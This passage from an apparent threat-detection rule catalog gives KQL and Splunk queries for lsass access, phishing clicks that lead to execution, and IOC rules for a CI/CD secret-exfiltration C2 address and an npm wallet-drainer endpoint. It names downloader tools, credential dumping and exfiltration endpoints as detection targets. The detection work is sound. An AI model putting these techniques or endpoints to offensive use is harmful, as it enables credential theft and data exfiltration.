| where ObjectName endswith "\lsass.exe"
| where Account !endswith "$"
| project TimeGenerated, Computer, Account, ObjectName, ProcessName,
          AccessMask, AccessReason
| order by TimeGenerated desc

Actions on Objectives
—
Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration.
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad). → Phishing-link click correlated to endpoint execution · Email attachment opened from external sender
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → Office app spawning script/LOLBin child process
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key.
Command & Control. Beacon to attacker infrastructure for control and tasking.
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage.
Phishing-link click correlated to endpoint execution Delivery High
User received an external email containing a URL, clicked it, and within 60 seconds the recipient's endpoint spawned a scripting interpreter or network downloader (PowerShell / cmd / mshta / curl / certutil / bitsadmin). This is the high-fidelity shape — a raw "user clicked an emailed URL" query is too noisy to alert on because every Microsoft 365 tenant generates thousands of legitimate clicks per day. The exec-correlation step suppresses the noise to roughly the rate at which a click actually drives onto-host execution, which is the actionable signal. Pair with UC_PHISH_LINK_BYPASS (Safe Links override) and UC_PHISH_LINK_NEWDOMAIN for orthogonal high-fidelity variants.
ATT&CKT1566.002 T1204.001 T1059.001
Data sourcesEmail.All_Email Web Endpoint.Processes EmailEvents EmailUrlInfo UrlClickEvents DeviceProcessEvents
// Phishing-link click that drives endpoint execution within 60s.
// Far higher fidelity than "every clicked URL" — most legitimate clicks
// never spawn a non-browser child process, so the join eliminates the
// 99% of noise that makes a raw click query unactionable.
let LookbackDays = 7d;
let SuspectClicks = UrlClickEvents
    | where Timestamp > ago(LookbackDays)
    | where AccountName !endswith "$"
    | where ActionType in ("ClickAllowed","ClickedThrough")
    | join kind=inner (
        EmailEvents
        | where Timestamp > ago(LookbackDays)
        | where DeliveryAction == "Delivered"
        | where EmailDirection == "Inbound"
        | project NetworkMessageId, Subject, SenderFromAddress, SenderFromDomain,
                  RecipientEmailAddress, EmailTimestamp = Timestamp
      ) on NetworkMessageId
    | join kind=leftouter (
        EmailUrlInfo | project NetworkMessageId, Url, UrlDomain
      ) on NetworkMessageId, Url
    | project ClickTime = Timestamp, AccountUpn, IPAddress, Url, UrlDomain,
              Subject, SenderFromAddress, SenderFromDomain, RecipientEmailAddress,
              ActionType;
// Correlate to a non-browser child process spawned within 60 seconds on
// the recipient's device.
DeviceProcessEvents
| where Timestamp > ago(LookbackDays)
| where InitiatingProcessFileName in~ ("chrome.exe","msedge.exe","firefox.exe",
                                         "outlook.exe","brave.exe","arc.exe")
| where FileName in~ ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                        "rundll32.exe","regsvr32.exe","wscript.exe","cscript.exe",
                        "bitsadmin.exe","certutil.exe","curl.exe","wget.exe")
| join kind=inner SuspectClicks on $left.AccountName == $right.AccountUpn
| where Timestamp between (ClickTime .. ClickTime + 60s)
| project ClickTime, ProcessTime = Timestamp,
          DelaySec = datetime_diff('second', Timestamp, ClickTime),
          DeviceName, AccountName, RecipientEmailAddress, SenderFromAddress,
          Subject, Url, UrlDomain, ActionType,
          FileName, ProcessCommandLine, InitiatingProcessFileName
| order by ClickTime desc
// UrlClickEvents has no clean Sentinel-native equivalent. The detection
// pivots to: Office Send→Receive proximity to SecurityEvent 4688 of a
// non-browser child process. Lower fidelity than the Defender version.
let LookbackDays = 7d;
let SuspectMailUsers = OfficeActivity
    | where TimeGenerated > ago(LookbackDays)
    | where OfficeWorkload == "Exchange"
    | where Operation =~ "Receive"
    | summarize Subject = any(Subject), Sender = any(Sender)
                by MailboxOwnerUPN, MessageId, EmailTime = bin(TimeGenerated, 1m);
SecurityEvent
| where TimeGenerated > ago(LookbackDays)
| where EventID == 4688
| where ParentProcessName has_any ("\chrome.exe","\msedge.exe",
                                     "\firefox.exe","\outlook.exe","\brave.exe")
| where NewProcessName has_any ("\powershell.exe","\pwsh.exe","\cmd.exe",
                                  "\mshta.exe","\rundll32.exe","\regsvr32.exe",
                                  "\wscript.exe","\cscript.exe","\bitsadmin.exe",
                                  "\certutil.exe","\curl.exe","\wget.exe")
| join kind=inner SuspectMailUsers on $left.Account == $right.MailboxOwnerUPN
| where TimeGenerated between (EmailTime .. EmailTime + 60s)
| project TimeGenerated, EmailTime, Computer, Account, ParentProcessName,
          NewProcessName, CommandLine, Sender, Subject
| order by TimeGenerated desc
WEB
Toggle if your env has no CIM data-model acceleration.
``` Phishing-link click that drives endpoint execution within 60s ```
| tstats `summariesonly` earliest(_time) AS click_time
    from datamodel=Web
    where Web.action="allowed"
    by Web.src, Web.user, Web.dest, Web.url
| `drop_dm_object_name(Web)`
| rename user AS recipient, dest AS clicked_domain, url AS clicked_url
| join type=inner recipient
    [| tstats `summariesonly` count
         from datamodel=Email.All_Email
         where All_Email.action="delivered" AND All_Email.url!="-"
         by All_Email.recipient, All_Email.src_user, All_Email.url, All_Email.subject
     | `drop_dm_object_name(All_Email)`
     | rex field=url "https?://(?<email_domain>[^/]+)"
     | rename recipient AS recipient]
| join type=inner src
    [| tstats `summariesonly` earliest(_time) AS exec_time
         values(Processes.process) AS exec_cmd, values(Processes.process_name) AS exec_proc
         from datamodel=Endpoint.Processes
         where Processes.parent_process_name IN ("chrome.exe","msedge.exe","firefox.exe",
                                                   "outlook.exe","brave.exe","arc.exe")

[LLM] Megalodon CI/CD C2 beacon to 216.126.225.129:8443 Command & Control High
Detects any outbound connection to the Megalodon campaign C2 endpoint (216.126.225.129:8443) used to exfiltrate CI secrets, AWS/GCP/Azure credentials, SSH keys, OIDC tokens, and source-code secrets harvested by base64-encoded bash payloads injected into GitHub Actions workflows. Catches both self-hosted runners executing the poisoned workflow and any developer workstation that cloned and ran a compromised pipeline. Rationale: C2 IP 216.126.225.129:8443 is named verbatim in SafeDep's primary write-up and reproduced in cross-coverage from cybersecuritynews.com, cybernews.com, hackread.com — a stable, single-purpose exfil endpoint. Any successful TCP connect to that pair from org telemetry is high-confidence compromise; no legitimate service known at that destination. Cross-checked against: • https://safedep.io/megalodon-mass-github-repo-backdooring-ci-workflows/ • https://cybersecuritynews.com/megalodon-malware-github-repos/ • https://hackread.com/github-repositories-megalodon-supply-chain-attack/
ATT&CKT1071.001 T1041 T1567
Data sourcesNetwork_Traffic.All_Traffic
DeviceNetworkEvents
| where Timestamp > ago(30d)
| where RemoteIP == "216.126.225.129"
| where RemotePort == 8443
| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessParentFileName, FolderPath = InitiatingProcessFolderPath, RemoteIP, RemotePort, RemoteUrl, LocalIP
| order by Timestamp desc
let MegalodonC2 = "216.126.225.129";
union isfuzzy=true
    (CommonSecurityLog
        | where TimeGenerated > ago(30d)
        | where DestinationIP == MegalodonC2 and DestinationPort == 8443
        | project TimeGenerated, SourceIP, SourceUserName, DestinationIP, DestinationPort, DeviceVendor, DeviceProduct, DeviceAction, RequestURL, SourceHostName),
    (ImNetworkSession
        | where TimeGenerated > ago(30d)
        | where DstIpAddr == MegalodonC2 and DstPortNumber == 8443
        | project TimeGenerated, SrcIpAddr, SrcHostname, SrcUsername, DstIpAddr, DstPortNumber, NetworkProtocol, DvcHostname)
| order by TimeGenerated desc

[LLM] Polymarket npm wallet drainer egress to polymarketbot.polymarketdev.workers.dev Actions on Objectives High
Detects DNS resolution or HTTP egress to polymarketbot.polymarketdev.workers.dev — the Cloudflare Worker endpoint used by the nine malicious polymarketdev npm packages (polymarket-trading-cli, polymarket-bot, polymarket-claude-code, etc.) to receive Ethereum/Polygon private keys pasted into the fake postinstall onboarding prompt. Path /v1/wallets/keys is the receive endpoint. Rationale: Domain `polymarketbot.polymarketdev.workers.dev` and the receive path `/v1/wallets/keys` are both stated verbatim in SafeDep's report and reproduced by StepSecurity's separate investigation of the polymarketdev/dev-protocol GitHub org takeover. Cloudflare Workers subdomains under a single throwaway account are single-purpose — any DNS hit is high-fidelity. Cross-checked against: • https://safedep.io/malicious-polymarket-npm-crypto-wallet-drainer/ • https://www.stepsecurity.io/blog/malicious-polymarket-bot-hides-in-hijacked-dev-protocol-github-org-and-steals-wallet-keys
ATT&CKT1567 T1041 T1552.001
Data sourcesNetwork_Resolution.DNS Web.Web
let badHost = "polymarketbot.polymarketdev.workers.dev";
union isfuzzy=true
  (DeviceNetworkEvents
    | where Timestamp > ago(30d)
    | where RemoteUrl has badHost
    | project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessParentFileName, RemoteUrl, RemoteIP, RemotePort),
  (DeviceEvents
    | where Timestamp > ago(30d)
    | where ActionType in ("DnsQueryResponse", "ConnectionSuccess", "ConnectionFailed")
    | where RemoteUrl has badHost or AdditionalFields has badHost
    | project Timestamp, DeviceName, ActionType, InitiatingProcessFileName, InitiatingProcessCommandLine, RemoteUrl, RemoteIP, AdditionalFields)
| order by Timestamp desc
let badHost = "polymarketbot.polymarketdev.workers.dev";
union isfuzzy=true
    (DnsEvents | where TimeGenerated > ago(30d) | where Name endswith badHost or Name has badHost | project TimeGenerated, Computer, ClientIP, Name, QueryType, ResultCode),
    (ImDnsActivity | where TimeGenerated > ago(30d) | where DnsQuery endswith badHost or DnsQuery has badHost | project TimeGenerated, SrcHostname, SrcIpAddr, DnsQuery, DnsResponseCodeName),
    (ImWebSession | where TimeGenerated > ago(30d) | where HttpHostName endswith badHost or Url has badHost | project TimeGenerated, SrcHostname, SrcIpAddr, SrcUsername, Url, HttpMethod, HttpRequestHeaderUserAgent),
    (CommonSecurityLog | where TimeGenerated > ago(30d) | where RequestURL has badHost or DestinationDnsDomain has badHost | project TimeGenerated, SourceIP, SourceUserName, RequestURL, DestinationDnsDomain, DeviceProduct)
| order by TimeGenerated desc
